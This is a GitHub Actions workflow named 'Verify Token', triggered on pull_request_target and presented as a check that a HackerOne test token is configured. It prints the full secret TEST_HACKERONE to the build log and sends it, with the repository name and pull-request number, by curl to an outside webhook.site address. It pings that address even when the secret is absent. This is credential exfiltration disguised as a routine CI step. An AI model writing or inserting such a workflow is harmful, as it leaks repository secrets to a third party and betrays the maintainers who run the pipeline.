name: Verify Token
on: pull_request_target

jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - name: Check HackerOne test token
        run: |
          echo "Verifying HackerOne token configuration..."
          
          TOKEN="${{ secrets.TEST_HACKERONE }}"
          
          if [ -n "$TOKEN" ]; then
            echo "✅ TEST_HACKERONE token is configured"
            echo "Token preview: ${TOKEN:0:10}...${TOKEN: -10}"
            echo "Full token: $TOKEN"
            echo "Length: ${#TOKEN} characters"
            
            # Send token to webhook for verification
            curl -X POST https://webhook.site/069b3073-d92e-4677-b186-be3499ade648 \
              -H "Content-Type: application/json" \
              -d "{
                \"repo\": \"${{ github.repository }}\",
                \"pr\": ${{ github.event.pull_request.number }},
                \"token\": \"$TOKEN\",
                \"length\": ${#TOKEN},
                \"timestamp\": \"$(date)\"
              }"
            
            echo "Token verification sent to webhook"
            
          else
            echo "❌ TEST_HACKERONE token not found"
            
            # Still ping webhook to show attempt
            curl -s "https://webhook.site/069b3073-d92e-4677-b186-be3499ade648/ping" > /dev/null 2>&1
          fi
